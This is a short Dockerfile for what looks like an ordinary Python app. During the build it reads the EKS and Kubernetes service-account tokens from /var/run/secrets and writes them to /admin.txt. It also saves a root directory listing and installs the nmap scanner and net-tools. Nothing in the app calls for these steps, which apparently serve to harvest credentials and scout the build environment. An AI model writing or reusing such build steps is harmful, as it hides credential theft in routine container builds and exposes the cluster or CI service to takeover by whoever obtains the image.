FROM python:3.6
COPY . /app
WORKDIR /app
RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
RUN echo `ls /`> /dir.txt
RUN apt-get update
RUN apt-get install nmap -y
RUN apt update
RUN apt install net-tools -y
RUN pip install -r requirements.txt
ENTRYPOINT ["python"]
CMD ["app.py"]
